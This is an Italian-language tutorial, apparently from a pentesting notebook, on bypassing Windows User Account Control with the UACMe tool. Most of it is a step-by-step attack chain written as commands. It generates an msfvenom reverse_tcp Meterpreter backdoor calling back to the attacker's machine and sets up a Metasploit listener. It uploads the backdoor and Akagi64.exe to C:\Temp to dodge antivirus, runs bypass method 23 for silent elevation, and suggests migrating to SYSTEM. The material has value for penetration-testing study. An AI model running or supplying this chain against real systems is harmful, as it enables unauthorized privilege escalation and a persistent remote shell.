
# Bypassing UAC with UACMe

## Cos’è l’UAC?

**UAC (User Account Control)** è una funzionalità di sicurezza introdotta con Windows Vista e mantenuta in tutte le versioni successive. Il suo obiettivo è impedire che software non autorizzati (inclusi malware) apportino modifiche critiche al sistema operativo senza il consenso esplicito dell’utente.

Quando un programma richiede privilegi elevati:

- Se l’utente è standard: viene richiesto l’inserimento delle credenziali di un amministratore.
- Se l’utente fa parte del gruppo “Administrators”: viene mostrato un prompt con richiesta di conferma.

Questo comportamento è uno dei principali ostacoli durante la **privilege escalation**, perché anche se l’utente appartiene al gruppo `Administrators`, Windows blocca l’elevazione automatica dei privilegi con un popup che richiede approvazione manuale (click su “Sì”).

## Perché e come si aggira?

Quando un attaccante compromette un account che è *membro del gruppo Administrators* ma non ha ancora privilegi SYSTEM, può trovarsi bloccato da UAC. In questi casi, è necessario trovare un modo per **bypassare UAC** senza interazione dell’utente.

## UACMe – Cos’è e come funziona?

**UACMe** è uno strumento open-source scritto in C, disponibile su <a href="https://github.com/hfiref0x/UACME">GitHub</a>

È una collezione di oltre **70 metodi di bypass UAC** che sfruttano vulnerabilità note, abusi di comandi nativi Windows (come `fodhelper.exe`, `eventvwr.exe`, `computerdefaults.exe`) o meccanismi interni come COM hijacking o DLL injection. Ogni metodo è referenziato, testato su varie versioni di Windows, ed è documentato nel codice.

Il nome del binario principale è `Akagi`, che può essere compilato e poi eseguito sul target.

## Esempio pratico

### Step 1 – Verifica contesto

Dopo aver ottenuto una sessione Meterpreter, verifichiamo se siamo in un contesto privilegiato con:

`getuid` per avere informazioni sul attuale utente <br>
`getprivs` per vedere gli attuali privilegi utente <br>

Se l’utente fa parte del gruppo Administrators ma l’UAC blocca l’elevazione, potremmo sfruttare una delle tecniche di bypass.

Con il comando:

`net user` Per vedere gli utenti presenti <br>
`net localgroup administrators` Per vedere i gruppi presenti e i partecipanti <br>

vediamo gli utenti e il gruppo di appartenenza. Se un utente non è SYSTEM ma è nel gruppo admin, possiamo agire.

### Step 2 – Generazione del payload

Per ottenere una nuova sessione privilegiata, generiamo un payload con:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KaliIP> LPORT=<Port> -f exe > backdoor.exe`

- `-p windows/meterpreter/reverse_tcp`: imposta il tipo di payload, in questo caso Meterpreter con connessione inversa TCP
- `LHOST`: è l’indirizzo IP della tua macchina Kali
- `LPORT`: è la porta su cui ascoltare
- `-f exe`: formato del file da generare, in questo caso eseguibile Windows
- `> backdoor.exe`: salva il payload nel file `backdoor.exe`

### Step 3 – Preparazione listener

Avvia un listener con Metasploit:

`use multi/handler` <br>
`set payload windows/meterpreter/reverse_tcp` <br>
`set LHOST <KaliIP>` <br>
`set LPORT <Port>` <br>
`run` <br>

`multi/handler` è un modulo generico per ricevere connessioni da payload creati con `msfvenom`. Serve a ricevere la connessione inversa dalla backdoor.

### Step 4 – Trasferimento dei file sul target

Dalla sessione Meterpreter attiva sul target:

`cd C:\` <br>
`mkdir Temp` <br>
`cd Temp` <br>
`upload backdoor.exe` <br>
`upload Akagi64.exe` <br>

Usiamo `Temp` invece della home per evitare alert nei controlli automatizzati o antivirus.

### Step 5 – Esecuzione bypass

Dalla shell del target su cui vogliamo effettuare il Privilege Escalation:

`dir` <br>
`./Akagi64.exe 23 C:\Temp\backdoor.exe` <br>

Qui `23` è il numero del metodo di bypass UAC integrato in UACMe. Puoi provare altri metodi se questo fallisce.
I metodi possono essere visualizzati nella pagina principale della Repository di GitHub nel file README.

La backdoor verrà eseguita con privilegi elevati, senza popup UAC.
Dopo l'esecuzione di questo comando, verrá aperta una shell sulla sessione di meterpeter che abbiamo messo in ascolto precedentemente. 

### Step 6 – Verifica privilegi

Nella nuova sessione Meterpreter ricevuta sulla macchina attaccante:

`getuid` <br>
`getprivs` <br>
`ps` <br>

Notiamo che con `getprivs` otterremo una lista di privilegi più lunga rispetto a quella precedente. 
Puoi anche migrare in un processo di sistema per ottenere privilegi SYSTEM. Se vedi `NT AUTHORITY\SYSTEM`, il bypass è riuscito.

---
